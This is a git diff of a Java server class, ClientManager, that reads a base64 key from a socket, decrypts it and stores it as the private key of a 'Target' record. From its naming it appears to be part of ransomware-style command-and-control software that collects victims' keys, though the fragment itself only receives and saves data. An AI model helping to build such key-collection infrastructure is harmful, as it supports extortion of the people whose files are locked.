@@ -1,37 +1,40 @@
 package onion.aluka;
 
 import java.io.BufferedInputStream;
-import java.io.DataInputStream;
 import java.io.IOException;
-import java.io.ObjectInputStream;
 import java.net.Socket;
-import java.security.PrivateKey;
-import java.security.PublicKey;
+
+import onion.aluka.core.EntityManager;
+import onion.aluka.datas.Target;
+import onion.aluka.datas.TargetRepository;
+
 
 public class ClientManager implements Runnable {
 
+	//Variables
 	private Socket socket;
-	private PublicKey publicKey;
-	private PrivateKey privateKey;
-
-	public ClientManager(Socket socket,PublicKey publicKey,PrivateKey privateKey) {
-		System.out.println("Received");
+	private static EntityManager entityManager = EntityManager.getInstance();
+	
+	public ClientManager(Socket socket) {
 		this.socket = socket;
-		this.publicKey = publicKey;
-		this.privateKey = privateKey;
 	}
 
 	@Override
 	public void run() {
 		try(BufferedInputStream bis = new BufferedInputStream(this.socket.getInputStream())) {
-			System.out.println("[ + ] - Reading key from this client");
 			int l;
 			byte[] bytes = new byte[1024];
 			String keyBase64 = "";
 			while((l=bis.read(bytes)) > 0) {
 				keyBase64 += new String(bytes,0,l);
 			}
-			System.out.println(keyBase64);
+			entityManager.decryptByte(keyBase64);
+			
+			//Making target
+			Target target = new Target();
+			keyBase64 = entityManager.decryptByte(keyBase64);
+			target.setPrivateKey(keyBase64);
+			AlukAserverApplication.saveTarget(target);
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
